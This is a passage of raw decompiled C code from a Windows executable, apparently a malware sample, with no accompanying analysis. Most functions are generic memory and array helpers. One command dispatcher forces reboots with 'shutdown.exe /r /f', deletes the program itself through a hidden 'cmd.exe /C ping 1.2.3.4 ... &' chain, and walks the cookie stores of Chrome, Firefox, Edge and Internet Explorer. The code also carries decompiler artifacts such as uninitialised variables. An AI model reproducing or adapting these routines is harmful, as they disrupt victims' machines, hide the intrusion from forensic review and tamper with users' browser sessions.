    return 0;
}

// Address range: 0x40283b - 0x402917
int32_t function_40283b(void) {
    // 0x40283b
    int32_t v1; // 0x40283b
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x402844
    uint32_t v3 = *v2; // 0x402844
    int32_t * v4 = (int32_t *)(v1 + 4); // 0x402847
    int32_t v5; // bp-20, 0x40283b
    int32_t v6 = &v5; // 0x40284a
    if (v3 >= *v4) {
        int32_t v7 = *(int32_t *)(v1 + 12) * (v3 + 1); // 0x402857
        int32_t v8 = function_406fa7(); // 0x402878
        int32_t v9 = 0; // 0x40287f
        if (v8 != 0) {
            // 0x402881
            *(int32_t *)v8 = v7;
            int32_t v10 = v8 + 4; // 0x402885
            int32_t v11 = v10; // 0x402893
            v9 = v10;
            if (v7 != 0) {
                *(int32_t *)v11 = 0;
                *(int32_t *)(v11 + 4) = 0;
                *(int32_t *)(v11 + 8) = 0;
                int32_t v12 = v7 - 1; // 0x4028a0
                v11 += 16;
                int32_t v13 = v12; // 0x4028a3
                v9 = v10;
                while (v12 != 0) {
                    // 0x402895
                    *(int32_t *)v11 = 0;
                    *(int32_t *)(v11 + 4) = 0;
                    *(int32_t *)(v11 + 8) = 0;
                    v12 = v13 - 1;
                    v11 += 16;
                    v13 = v12;
                    v9 = v10;
                }
            }
        }
        // 0x4028af
        int32_t v14; // bp-28, 0x40283b
        int32_t v15 = &v14; // 0x40285d
        int32_t v16 = *v2; // 0x4028af
        int32_t v17 = 0; // 0x4028b4
        int32_t v18 = v15; // 0x4028b4
        if (v16 != 0) {
            int32_t v19 = v15;
            int32_t v20 = v19 - 4; // 0x4028c5
            *(int32_t *)v20 = v16 + v17;
            function_402979(v17);
            int32_t v21 = 1; // 0x4028ce
            uint32_t v22 = *v2; // 0x4028cf
            v17 += 16;
            int32_t v23 = v21; // 0x4028da
            while (v21 < v22) {
                // 0x4028be
                v19 = v20;
                v20 = v19 - 4;
                *(int32_t *)v20 = v22 + v17;
                function_402979(v17);
                v21 = v23 + 1;
                v22 = *v2;
                v17 += 16;
                v23 = v21;
            }
            // 0x4028df
            v18 = v20;
            if (v22 != 0) {
                int32_t v24 = v19 - 8; // 0x4028e4
                *(int32_t *)v24 = v22;
                function_401c7a();
                v18 = v24;
            }
        }
        // 0x4028ef
        *v4 = v7;
        *(int32_t *)v1 = v9;
        v6 = v18 + 8;
    }
    // 0x4028f9
    int32_t v25; // 0x40283b
    *(int32_t *)(v6 - 4) = (int32_t)&v25;
    function_402979((int32_t)&g322);
    *v2 = *v2 + 1;
    return function_4015d4();
}

// Address range: 0x402917 - 0x40295e
int32_t function_402917(int32_t a1) {
    // 0x402917
    int32_t result; // 0x402917
    *(int32_t *)(result + 12) = 5;
    *(int32_t *)(result + 4) = 5;
    *(int32_t *)(result + 8) = 0;
    function_4029af();
    int32_t * v1 = (int32_t *)(a1 + 8); // 0x402935
    if (*v1 == 0) {
        // 0x402955
        return result;
    }
    // 0x40293a
    int32_t v2; // bp-16, 0x402917
    int32_t v3 = &v2; // 0x402942
    for (int32_t i = 0; i < *v1; i++) {
        int32_t v4 = v3;
        *(int32_t *)(v4 - 20) = i;
        v3 = v4 - 24;
        *(int32_t *)v3 = v4 - 16;
        function_402a03((int32_t)&g322, (int32_t)&g322);
        function_40283b();
    }
    // 0x402955
    return result;
}

// Address range: 0x40295e - 0x402979
int32_t function_40295e(void) {
    // 0x40295e
    int32_t v1; // 0x40295e
    if (v1 != 0) {
        // 0x402967
        function_401c7a();
    }
    // 0x40296d
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x402979 - 0x4029af
int32_t function_402979(int32_t a1) {
    // 0x402979
    function_4043c7(a1);
    function_4043c7(a1 + 4);
    function_4043c7(a1 + 8);
    int32_t result; // 0x402979
    *(int32_t *)(result + 12) = *(int32_t *)(a1 + 12);
    return result;
}

// Address range: 0x4029af - 0x402a03
int32_t function_4029af(void) {
    // 0x4029af
    int32_t v1; // 0x4029af
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x4029b9
    int32_t v3 = function_406fa7(); // 0x4029d3
    if (v3 == 0) {
        // 0x4029fd
        *(int32_t *)v1 = 0;
        return 0;
    }
    // 0x4029dc
    *(int32_t *)v3 = v2;
    int32_t result = v3 + 4; // 0x4029de
    int32_t v4 = v2; // 0x4029e5
    if (v2 == 0) {
        // 0x4029fd
        *(int32_t *)v1 = result;
        return result;
    }
    *(int32_t *)result = 0;
    int32_t result2 = result + 16; // 0x4029eb
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    v4--;
    while (v4 != 0) {
        int32_t v5 = result2;
        *(int32_t *)v5 = 0;
        result2 = v5 + 16;
        *(int32_t *)(v5 + 4) = 0;
        *(int32_t *)(v5 + 8) = 0;
        v4--;
    }
    // 0x4029fd
    *(int32_t *)v1 = result;
    return result2;
}

// Address range: 0x402a03 - 0x402a2f
int32_t function_402a03(int32_t result, int32_t a2) {
    // 0x402a03
    function_406d65();
    function_402790(16 * a2 + result);
    return result;
}

// Address range: 0x402a2f - 0x402a5c
int32_t function_402a2f(int32_t dwMilliseconds) {
    // 0x402a2f
    int32_t v1; // 0x402a2f
    if (v1 == 0) {
        // 0x402a57
        return 1;
    }
    int32_t * hHandle = (int32_t *)v1; // 0x402a44
    int32_t v2 = WaitForSingleObject(hHandle, dwMilliseconds); // 0x402a44
    int32_t result = 0; // 0x402a4c
    if (v2 == 0) {
        // 0x402a4e
        *hHandle = v2 & v1;
        int32_t * v3 = (int32_t *)(v1 + 4); // 0x402a50
        *v3 = *v3 & v2;
        result = 1;
    }
    // 0x402a57
    return result;
}

// Address range: 0x402a5c - 0x402b12
int32_t function_402a5c(int32_t a1) {
    int32_t v1 = a1;
    int32_t v2; // 0x402a5c
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x402a63
    uint32_t v4 = *v3; // 0x402a63
    int32_t * v5 = (int32_t *)(v2 + 4); // 0x402a66
    int32_t v6; // bp-12, 0x402a5c
    int32_t v7 = &v6; // 0x402a69
    if (v4 >= *v5) {
        int32_t v8 = *(int32_t *)(v2 + 12) * (v4 + 1); // 0x402a76
        int32_t v9 = function_406fa7(); // 0x402a97
        int32_t v10 = 0; // 0x402a9e
        if (v9 != 0) {
            // 0x402aa0
            *(int32_t *)v9 = v8;
            int32_t v11 = v9 + 4; // 0x402aa2
            v10 = v11;
            if (v8 != 0) {
                // 0x402aa9
                __asm_rep_stosd_memset((char *)v11, 0, v8);
                v10 = v11;
            }
        }
        // 0x402ab8
        int32_t v12; // bp-20, 0x402a5c
        int32_t v13 = &v12; // 0x402a7c
        int32_t v14 = *v3; // 0x402ab8
        int32_t v15 = 0; // 0x402abd
        int32_t v16 = v13; // 0x402abd
        if (v14 != 0) {
            int32_t v17 = v13;
            int32_t v18 = v17 - 4; // 0x402acc
            *(int32_t *)v18 = 4 * v15 + v14;
            function_4043c7((int32_t)&g322);
            uint32_t v19 = *v3; // 0x402ad2
            int32_t v20 = v15 + 1; // 0x402ad5
            v15 = v20;
            while (v20 < v19) {
                // 0x402ac1
                v17 = v18;
                v18 = v17 - 4;
                *(int32_t *)v18 = 4 * v15 + v19;
                function_4043c7((int32_t)&g322);
                v19 = *v3;
                v20 = v15 + 1;
                v15 = v20;
            }
            // 0x402add
            v16 = v18;
            if (v19 != 0) {
                int32_t v21 = v17 - 8; // 0x402ae2
                *(int32_t *)v21 = v19;
                function_402b2d();
                v16 = v21;
            }
        }
        // 0x402aed
        *v5 = v8;
        *(int32_t *)v2 = v10;
        v7 = v16 + 8;
    }
    // 0x402af4
    *(int32_t *)(v7 - 4) = (int32_t)&v1;
    function_4043c7((int32_t)&g322);
    *v3 = *v3 + 1;
    return function_406f1d();
}

// Address range: 0x402b12 - 0x402b2d
int32_t function_402b12(void) {
    // 0x402b12
    int32_t v1; // 0x402b12
    if (v1 != 0) {
        // 0x402b1b
        function_402b2d();
    }
    // 0x402b21
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x402b2d - 0x402b5d
int32_t function_402b2d(void) {
    // 0x402b2d
    int32_t v1; // 0x402b2d
    int32_t result = v1 - 4; // 0x402b2f
    int32_t v2 = *(int32_t *)result; // 0x402b32
    if (v2 == 0) {
        // 0x402b4e
        function_406f8d();
        return result;
    }
    int32_t v3 = v2; // 0x402b49
    int32_t v4 = 4 * v2 + v1; // 0x402b3c
    v4 -= 4;
    function_406f1d();
    *(int32_t *)v4 = 0;
    v3--;
    while (v3 != 0) {
        // 0x402b3c
        v4 -= 4;
        function_406f1d();
        *(int32_t *)v4 = 0;
        v3--;
    }
    // 0x402b4e
    function_406f8d();
    return result;
}

// Address range: 0x402b5d - 0x402b7b
int32_t function_402b5d(unsigned char a1) {
    // 0x402b5d
    int32_t result; // 0x402b5d
    *(int32_t *)result = (int32_t)&g116;
    if (a1 % 2 != 0) {
        // 0x402b6f
        function_406f8d();
    }
    // 0x402b74
    return result;
}

// Address range: 0x402b7b - 0x402c80
int32_t function_402b7b(void) {
    // 0x402b7b
    int32_t v1; // bp-36, 0x402b7b
    int32_t v2 = &v1; // 0x402b85
    int32_t v3; // 0x402b7b
    int32_t * v4 = (int32_t *)(v3 + 8); // 0x402b89
    uint32_t v5 = *v4; // 0x402b89
    int32_t * v6 = (int32_t *)(v3 + 4); // 0x402b8c
    int32_t v7 = v5; // 0x402b8f
    int32_t v8 = v2; // 0x402b8f
    if (v5 >= *v6) {
        int32_t v9 = *(int32_t *)(v3 + 12) * (v5 + 1); // 0x402b98
        int32_t v10 = function_406fa7(); // 0x402bbb
        int32_t v11 = 0; // 0x402bc7
        if (v10 != 0) {
            // 0x402bc9
            *(int32_t *)v10 = v9;
            int32_t v12 = v10 + 4; // 0x402bcb
            v11 = v12;
            if (v9 != 0) {
                int32_t v13 = v10 + 44; // 0x402bd7
                int32_t v14 = v9; // 0x402bd7
                *(int32_t *)v13 = 0;
                *(int32_t *)(v13 + 4) = 0;
                v14--;
                v13 += 48;
                v11 = v12;
                while (v14 != 0) {
                    // 0x402bda
                    *(int32_t *)v13 = 0;
                    *(int32_t *)(v13 + 4) = 0;
                    v14--;
                    v13 += 48;
                    v11 = v12;
                }
            }
        }
        int32_t v15 = v11; // 0x402bf6
        int32_t v16 = 0; // 0x402bf6
        int32_t v17 = 0; // 0x402bf6
        v7 = 0;
        v8 = v2;
        if (*v4 != 0) {
            int32_t v18 = v2;
            int32_t v19 = v17 + v16; // 0x402c04
            int32_t v20 = v18 - 4; // 0x402c06
            int32_t * v21 = (int32_t *)v20; // 0x402c06
            *v21 = 10;
            __asm_rep_movsd_memcpy((char *)v15, (char *)v19, 10);
            *v21 = v19 + 40;
            function_403eca((int32_t)&g322);
            int32_t v22 = v16 + 1; // 0x402c1f
            v15 += 48;
            v16 = v22;
            v17 += 48;
            while (v22 < *v4) {
                // 0x402c00
                v18 = v20;
                v19 = v17 + v16;
                v20 = v18 - 4;
                v21 = (int32_t *)v20;
                *v21 = 10;
                __asm_rep_movsd_memcpy((char *)v15, (char *)v19, 10);
                *v21 = v19 + 40;
                function_403eca((int32_t)&g322);
                v22 = v16 + 1;
                v15 += 48;
                v16 = v22;
                v17 += 48;
            }
            // 0x402c42
            v8 = v18 - 8;
            *(int32_t *)v8 = v22;
            function_402489();
            v7 = *v4;
        }
        // 0x402c4b
        *(int32_t *)v3 = v11;
        *v6 = v9;
    }
    int32_t * v23 = (int32_t *)(v8 - 4); // 0x402c59
    *v23 = 10;
    int32_t v24; // 0x402b7b
    __asm_rep_movsd_memcpy((char *)(48 * v7 | 10), (char *)&v24, 10);
    int32_t v25; // bp+44, 0x402b7b
    *v23 = (int32_t)&v25;
    function_403eca((int32_t)&g322);
    *v4 = *v4 + 1;
    return function_404081();
}

// Address range: 0x402c80 - 0x402cac
int32_t function_402c80(int32_t result, int32_t a2) {
    // 0x402c80
    function_406d65();
    function_4148d1(48 * a2 + result);
    return result;
}

// Address range: 0x402cac - 0x402d67
int32_t function_402cac(int32_t a1) {
    // 0x402cac
    int32_t result; // 0x402cac
    *(int32_t *)result = *(int32_t *)a1;
    *(int32_t *)(result + 4) = *(int32_t *)(a1 + 4);
    function_403eca(a1 + 8);
    function_4043c7(a1 + 16);
    *(int32_t *)(result + 20) = *(int32_t *)(a1 + 20);
    function_4043c7(a1 + 24);
    *(int32_t *)(result + 28) = *(int32_t *)(a1 + 28);
    *(int32_t *)(result + 32) = *(int32_t *)(a1 + 32);
    function_4043c7(a1 + 36);
    *(int32_t *)(result + 40) = *(int32_t *)(a1 + 40);
    function_4043c7(a1 + 44);
    function_4043c7(a1 + 48);
    *(int32_t *)(result + 52) = *(int32_t *)(a1 + 52);
    function_4043c7(a1 + 56);
    *(int32_t *)(result + 60) = *(int32_t *)(a1 + 60);
    *(int32_t *)(result + 64) = *(int32_t *)(a1 + 64);
    *(int32_t *)(result + 68) = *(int32_t *)(a1 + 68);
    *(int32_t *)(result + 72) = *(int32_t *)(a1 + 72);
    *(int32_t *)(result + 76) = *(int32_t *)(a1 + 76);
    function_403eca(a1 + 80);
    return result;
}

// Address range: 0x402d67 - 0x402d86
int32_t function_402d67(unsigned char a1) {
    // 0x402d67
    function_416233();
    if (a1 % 2 != 0) {
        // 0x402d78
        function_406f8d();
    }
    // 0x402d7f
    int32_t result; // 0x402d67
    return result;
}

// Address range: 0x402d86 - 0x402da0
int32_t function_402d86(void) {
    // 0x402d86
    int32_t v1; // 0x402d86
    if (v1 != 0) {
        // 0x402d8f
        function_406f8d();
    }
    // 0x402d94
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x402da0 - 0x402e04
int32_t function_402da0(int32_t result) {
    // 0x402da0
    int32_t v1; // 0x402da0
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x402da6
    uint32_t v3 = *v2; // 0x402da6
    int32_t * v4 = (int32_t *)(v1 + 4); // 0x402da9
    int32_t v5 = v3; // 0x402dac
    int32_t v6; // 0x402da0
    if (v3 >= *v4) {
        uint32_t v7 = *(int32_t *)(v1 + 12) * (v3 + 1); // 0x402db5
        int32_t v8 = v7 > 0x3fffffff ? -1 : 4 * v7; // 0x402dc5
        int32_t v9 = function_406fa7(); // 0x402dc7
        int32_t v10 = 0; // 0x402dd3
        if (*v2 != 0) {
            int32_t v11 = 4 * v10; // 0x402dd7
            *(int32_t *)(v11 + v9) = *(int32_t *)(v11 + v8);
            int32_t v12 = v10 + 1; // 0x402ddd
            v10 = v12;
            while (v12 < *v2) {
                // 0x402dd5
                v11 = 4 * v10;
                *(int32_t *)(v11 + v9) = *(int32_t *)(v11 + v8);
                v12 = v10 + 1;
                v10 = v12;
            }
        }
        // 0x402de3
        function_406f8d();
        *v4 = v7;
        *(int32_t *)v1 = v9;
        v5 = *v2;
        v6 = v8;
    }
    // 0x402df1
    *(int32_t *)(4 * v5 + v6) = result;
    *v2 = *v2 + 1;
    return result;
}

// Address range: 0x402e04 - 0x402eaf
int32_t function_402e04(int32_t a1) {
    // 0x402e04
    int32_t result; // 0x402e04
    int32_t * v1 = (int32_t *)(result + 8); // 0x402e13
    *v1 = 0;
    int32_t * v2 = (int32_t *)(result + 12); // 0x402e18
    *v2 = 5;
    int32_t * v3 = (int32_t *)(result + 4); // 0x402e1b
    *v3 = 5;
    int32_t v4 = function_406fa7(); // 0x402e1e
    int32_t * v5 = (int32_t *)result; // 0x402e28
    *v5 = v4;
    for (int32_t i = 0; i < *(int32_t *)(a1 + 8); i++) {
        // 0x402e33
        function_406d65();
        uint32_t v6 = *v1; // 0x402e43
        int32_t v7 = v6; // 0x402e49
        if (v6 >= *v3) {
            uint32_t v8 = *v2 * (v6 + 1); // 0x402e4e
            int32_t v9; // bp-24, 0x402e04
            *(int32_t *)((int32_t)&v9 - 4) = 4;
            int32_t v10 = function_406fa7(); // 0x402e61
            if (*v1 != 0) {
                int32_t v11 = v8 > 0x3fffffff ? -1 : 4 * v8; // 0x402e72
                for (int32_t j = 0; j < *v1; j++) {
                    int32_t v12 = 4 * j; // 0x402e72
                    v11 += v12;
                    *(int32_t *)(v12 + v10) = v11;
                }
            }
            // 0x402e7e
            function_406f8d();
            *v5 = v10;
            *v3 = v8;
            v7 = *v1;
        }
        // 0x402e90
        *(int32_t *)(5 * v7) = *(int32_t *)(*(int32_t *)a1 + 4 * i);
        *v1 = *v1 + 1;
    }
    // 0x402ea6
    return result;
}

// Address range: 0x402eaf - 0x402ec3
int32_t function_402eaf(void) {
    // 0x402eaf
    int32_t v1; // 0x402eaf
    if (v1 != 0) {
        // 0x402eb8
        *(int32_t *)v1 = 0;
    }
    // 0x402ec1
    int32_t result; // 0x402eaf
    return result;
}

// Address range: 0x402ec3 - 0x402ee2
int32_t function_402ec3(unsigned char a1) {
    // 0x402ec3
    int32_t result; // 0x402ec3
    function_41705f(result, result);
    if (a1 % 2 != 0) {
        // 0x402ed4
        function_406f8d();
    }
    // 0x402edb
    return result;
}

// Address range: 0x402ee2 - 0x402f01
int32_t function_402ee2(unsigned char a1) {
    // 0x402ee2
    int32_t result; // 0x402ee2
    function_417105(result, result);
    if (a1 % 2 != 0) {
        // 0x402ef3
        function_406f8d();
    }
    // 0x402efa
    return result;
}

// Address range: 0x402f01 - 0x402f20
int32_t function_402f01(unsigned char a1) {
    // 0x402f01
    int32_t result; // 0x402f01
    function_4172da(result, result);
    if (a1 % 2 != 0) {
        // 0x402f12
        function_406f8d();
    }
    // 0x402f19
    return result;
}

// Address range: 0x402f20 - 0x402f3f
int32_t function_402f20(unsigned char a1) {
    // 0x402f20
    function_41739a();
    if (a1 % 2 != 0) {
        // 0x402f31
        function_406f8d();
    }
    // 0x402f38
    int32_t result; // 0x402f20
    return result;
}

// Address range: 0x402f3f - 0x402f5e
int32_t function_402f3f(unsigned char a1) {
    // 0x402f3f
    int32_t result; // 0x402f3f
    function_4174a1(result, result);
    if (a1 % 2 != 0) {
        // 0x402f50
        function_406f8d();
    }
    // 0x402f57
    return result;
}

// Address range: 0x402f5e - 0x402f7c
int32_t function_402f5e(unsigned char a1) {
    // 0x402f5e
    int32_t result; // 0x402f5e
    *(int32_t *)result = (int32_t)&g132;
    if (a1 % 2 != 0) {
        // 0x402f70
        function_406f8d();
    }
    // 0x402f75
    return result;
}

// Address range: 0x402f7c - 0x402f9a
int32_t function_402f7c(unsigned char a1) {
    // 0x402f7c
    int32_t result; // 0x402f7c
    *(int32_t *)result = (int32_t)&g133;
    if (a1 % 2 != 0) {
        // 0x402f8e
        function_406f8d();
    }
    // 0x402f93
    return result;
}

// Address range: 0x402f9a - 0x402fbc
int32_t function_402f9a(void) {
    // 0x402f9a
    int32_t v1; // 0x402f9a
    int32_t hObject = *(int32_t *)(v1 + 16); // 0x402f9d
    if (hObject != 0) {
        // 0x402fa3
        CloseHandle((int32_t *)hObject);
    }
    // 0x402fac
    function_406f1d();
    return function_404081();
}

// Address range: 0x402fbc - 0x402fda
int32_t function_402fbc(unsigned char a1) {
    // 0x402fbc
    int32_t result; // 0x402fbc
    *(int32_t *)result = (int32_t)&g134;
    if (a1 % 2 != 0) {
        // 0x402fce
        function_406f8d();
    }
    // 0x402fd3
    return result;
}

// Address range: 0x402fda - 0x402ff8
int32_t function_402fda(unsigned char a1) {
    // 0x402fda
    int32_t result; // 0x402fda
    *(int32_t *)result = (int32_t)&g135;
    if (a1 % 2 != 0) {
        // 0x402fec
        function_406f8d();
    }
    // 0x402ff1
    return result;
}

// Address range: 0x402ff8 - 0x4030ea
int32_t function_402ff8(int32_t result) {
    // 0x402ff8
    int128_t v1; // 0x402ff8
    int128_t v2 = v1;
    int128_t v3 = __asm_xorps(v2, v2); // 0x40300e
    int32_t v4; // 0x402ff8
    int32_t v5 = *(int32_t *)(v4 + 12); // bp-52, 0x403017
    int32_t v6 = &v5; // 0x403017
    __asm_movups(v1, v3);
    function_404767((int32_t)&g322);
    int32_t * v7 = (int32_t *)(v4 + 8); // 0x403028
    if (*v7 == 0) {
        // 0x4030c9
        *(int32_t *)(v6 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    int32_t * v8 = (int32_t *)(v4 + 4); // 0x403033
    int32_t v9 = 0; // 0x402ff8
    int32_t v10 = v6; // 0x4030b3
    int32_t v11 = 0; // 0x4030bc
    *(int32_t *)(v10 - 4) = *v8 + v9;
    function_404788((int32_t)&g322);
    *(int32_t *)(v10 - 8) = *v8 + (v9 | 4);
    function_404788((int32_t)&g322);
    *(int32_t *)(v10 - 12) = v9 + 8 + *v8;
    function_404788((int32_t)&g322);
    *(int32_t *)(v10 - 16) = v9 + 12 + *v8;
    function_404788((int32_t)&g322);
    int32_t v12 = *v8 + v9;
    *(int32_t *)(v10 - 20) = *(int32_t *)(v12 + 20);
    *(int32_t *)(v10 - 24) = *(int32_t *)(v12 + 16);
    function_404740((int32_t)&g322, (int32_t)&g322);
    *(int32_t *)(v10 - 28) = *(int32_t *)(v9 + 24 + *v8);
    function_404767((int32_t)&g322);
    *(int32_t *)(v10 - 32) = *(int32_t *)(v9 + 28 + *v8);
    function_404767((int32_t)&g322);
    v10 -= 36;
    *(int32_t *)v10 = *(int32_t *)(v9 + 32 + *v8);
    function_404767((int32_t)&g322);
    v11++;
    v9 += 40;
    while (v11 < *v7) {
        // 0x403033
        *(int32_t *)(v10 - 4) = *v8 + v9;
        function_404788((int32_t)&g322);
        *(int32_t *)(v10 - 8) = *v8 + (v9 | 4);
        function_404788((int32_t)&g322);
        *(int32_t *)(v10 - 12) = v9 + 8 + *v8;
        function_404788((int32_t)&g322);
        *(int32_t *)(v10 - 16) = v9 + 12 + *v8;
        function_404788((int32_t)&g322);
        v12 = *v8 + v9;
        *(int32_t *)(v10 - 20) = *(int32_t *)(v12 + 20);
        *(int32_t *)(v10 - 24) = *(int32_t *)(v12 + 16);
        function_404740((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v10 - 28) = *(int32_t *)(v9 + 24 + *v8);
        function_404767((int32_t)&g322);
        *(int32_t *)(v10 - 32) = *(int32_t *)(v9 + 28 + *v8);
        function_404767((int32_t)&g322);
        v10 -= 36;
        *(int32_t *)v10 = *(int32_t *)(v9 + 32 + *v8);
        function_404767((int32_t)&g322);
        v11++;
        v9 += 40;
    }
    // 0x4030c9
    *(int32_t *)(v10 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x4030ea - 0x4030f1
int32_t function_4030ea(void) {
    // 0x4030ea
    int32_t result; // 0x4030ea
    *(int32_t *)result = (int32_t)&g13;
    return result;
}

// Address range: 0x4030f1 - 0x403112
int32_t function_4030f1(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4030f1
    int32_t result; // 0x4030f1
    *(int32_t *)(result + 4) = a1;
    *(int32_t *)(result + 12) = a3;
    *(int32_t *)result = (int32_t)&g13;
    *(int32_t *)(result + 8) = a2;
    return result;
}

// Address range: 0x403112 - 0x403123
int32_t function_403112(int32_t a1) {
    int32_t result = *(int32_t *)*(int32_t *)a1; // 0x40311a
    int32_t v1; // 0x403112
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x403123 - 0x40312a
int32_t function_403123(void) {
    // 0x403123
    int32_t result; // 0x403123
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x40312a - 0x403137
int32_t function_40312a(void) {
    // 0x40312a
    int32_t result; // 0x40312a
    *(int32_t *)(result + 4) = -1;
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x403137 - 0x40313a
int32_t function_403137(void) {
    // 0x403137
    int32_t result; // 0x403137
    return result;
}

// Address range: 0x40313a - 0x403142
int32_t function_40313a(void) {
    // 0x40313a
    int32_t v1; // 0x40313a
    return function_410210(v1);
}

// Address range: 0x403142 - 0x40314b
int32_t function_403142(void) {
    // 0x403142
    int32_t v1; // 0x403142
    return function_411f55(v1);
}

// Address range: 0x40314b - 0x4034d1
int32_t function_40314b(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40314b
    int32_t lpAppName; // 0x40314b
    int32_t v1 = *(int32_t *)(lpAppName + 4); // 0x40314e
    char * lpCmdLine = "shutdown.exe /r /f /t 00"; // 0x40314b
    int32_t lpCommandLine; // bp-1012, 0x40314b
    int32_t v2; // bp-1628, 0x40314b
    int32_t lpStartupInfo; // bp-228, 0x40314b
    int32_t lpFilename; // bp-492, 0x40314b
    int32_t lpProcessInformation; // bp-60, 0x40314b
    int32_t lpsz; // bp-8, 0x40314b
    int32_t v3; // 0x4033bb
    switch (v1) {
        case 0: {
            // 0x4034c0
            lpCmdLine = "shutdown.exe /r /t 00";
            // 0x4034cc
            return WinExec(lpCmdLine, 0);
        }
        case 1: {
            // 0x4034cc
            return WinExec(lpCmdLine, 0);
        }
        case 2: {
            // 0x40346c
            GetProcAddress(LoadLibraryA("ntdll.dll"), (char *)&g322);
            GetProcAddress(GetModuleHandleA("ntdll.dll"), (char *)&g322);
            // 0x4034cc
            int32_t v4; // bp-44, 0x40314b
            return &v4;
        }
        case 3: {
            // 0x40334e
            int32_t v5; // bp-152, 0x40314b
            function_401293(&v5, 0, 68);
            __asm_rep_movsd_memcpy((char *)&lpStartupInfo, (char *)&v5, 17);
            int32_t v6 = 0; // bp-76, 0x403376
            bool v7; // 0x40314b
            int32_t v8 = v7 ? -4 : 4; // 0x403376
            int32_t v9 = v8 + (int32_t)&v6; // 0x403376
            int32_t * v10 = (int32_t *)v9; // 0x40337f
            *v10 = 0;
            int32_t v11 = v9 + v8; // 0x40337f
            int32_t * v12 = (int32_t *)v11; // 0x403380
            *v12 = 0;
            int32_t * v13 = (int32_t *)(v11 + v8); // 0x403381
            *v13 = 0;
            lpProcessInformation = v6;
            int32_t v14 = v8 + (int32_t)&lpProcessInformation; // 0x40338b
            *(int32_t *)v14 = *v10;
            int32_t v15 = v14 + v8; // 0x40338e
            *(int32_t *)v15 = *v12;
            *(int32_t *)(v15 + v8) = *v13;
            GetModuleFileNameA(NULL, (char *)&lpFilename, 260);
            __asm_rep_movsd_memcpy((char *)&lpCommandLine, "cmd.exe /C ping 1.2.3.4 -n 4 -w 1000 > Nul & cmd.exe /C ", 14);
            int32_t v16 = &lpFilename;
            v3 = v16 + 1;
            while (*(char *)v16 != 0) {
                // 0x4033b9
                v16 = v3;
                v3 = v16 + 1;
            }
            // break -> 0x4033c0
            break;
        }
        case 4: {
            // 0x403347
            int32_t v17; // bp-1548, 0x40314b
            *(int32_t *)((int32_t)&v17 - 4) = 0;
            ExitProcess((int32_t)&g322);
            // UNREACHABLE
        }
        default: {
            int32_t v18 = v1 - 5; // 0x403188
            int32_t result = v18; // 0x40318b
            if (v18 == 0) {
                // 0x403191
                function_413fc0();
                function_413915();
                function_4043fa(L"Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
                function_404656((int32_t)&lpsz);
                function_413c34((int32_t)&g322);
                function_413915();
                function_4043fa((int16_t *)&g20);
                int32_t v19; // bp-20, 0x40314b
                function_404656((int32_t)&v19);
                function_4043fa(L"profiles.ini");
                function_40460a(L"Profile");
                function_404477(0);
                int32_t lpReturnedString; // bp-1532, 0x40314b
                function_401293(&lpReturnedString, 0, 520);
                GetPrivateProfileStringW((int16_t *)lpAppName, L"Path", NULL, (int16_t *)&lpReturnedString, 260, (int16_t *)lpAppName);
                function_404656(0);
                function_4043fa((int16_t *)&lpReturnedString);
                function_404422("\\cookies.sqlite");
                int32_t v20; // bp-16, 0x40314b
                function_404656((int32_t)&v20);
                function_413c34((int32_t)&g322);
                function_413915();
                function_404422("\\Microsoft\\Edge\\User Data\\Default\\cookies");
                int32_t v21; // bp-36, 0x40314b
                int32_t v22 = &v21; // 0x403297
                v2 = v22;
                function_404656(v22);
                function_413c34((int32_t)&g322);
                function_413915();
                v2 = (int32_t)"\\Microsoft\\Windows\\INetCookies";
                function_404422("\\Microsoft\\Windows\\INetCookies");
                int32_t v23; // bp-32, 0x40314b
                function_404656((int32_t)&v23);
                function_413c34((int32_t)&g322);
                function_413915();
                function_404422("\\Microsoft\\Windows\\Cookies");
                int32_t v24; // bp-28, 0x40314b
                function_404656((int32_t)&v24);
                function_413c34((int32_t)&g322);
                function_406f1d();
                function_406f1d();
                function_406f1d();
                function_406f1d();
                v20 = 0;
                function_406f1d();
                function_406f1d();
                function_406f1d();
                function_406f1d();
                result = function_413c16();
            }
            // 0x4034cc
            return result;
        }
    }
    // 0x4033c0
    int32_t v25; // bp-491, 0x40314b
    int32_t v26 = v3 - (int32_t)&v25; // 0x4033c0
    int32_t v27; // bp-955, 0x40314b
    function_40126d(&v27, &lpFilename, v26);
    int32_t v28; // bp-4, 0x40314b
    *(int16_t *)((int32_t)&v28 - 951 + v26) = 34;
    function_413915();
    function_4043fa((int16_t *)&g19);
    function_413960();
    if (lstrcmpW(CharLowerW((int16_t *)lpAppName), CharLowerW((int16_t *)lpsz)) == 0) {
        // 0x40345a
        function_406f1d();
        // 0x4034cc
        return function_406f1d();
    }
    // 0x403422
    CreateProcessA(NULL, (char *)&lpCommandLine, NULL, NULL, false, 0x8000000, NULL, NULL, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
    CloseHandle((int32_t *)lpAppName);
    v2 = lpProcessInformation;
    CloseHandle((int32_t *)lpProcessInformation);
    // 0x403347
    *(int32_t *)((int32_t)&v2 - 4) = 0;
    ExitProcess((int32_t)&g322);
    // UNREACHABLE
}

// Address range: 0x4034d1 - 0x40353f
int32_t function_4034d1(void) {
    // 0x4034d1
